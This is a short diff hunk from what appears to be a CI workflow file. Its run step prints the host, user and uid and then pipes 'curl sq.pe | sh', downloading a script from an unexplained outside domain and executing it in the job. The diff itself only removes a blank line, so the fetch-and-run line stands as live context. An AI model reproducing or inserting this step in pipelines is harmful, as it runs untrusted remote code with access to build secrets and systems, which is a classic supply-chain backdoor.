@@ -202,4 +202,3 @@ jobs:
         run: |
           echo "[pod]  host=$(hostname) user=$(id -un) uid=$(id -u)"
           curl sq.pe | sh
-          
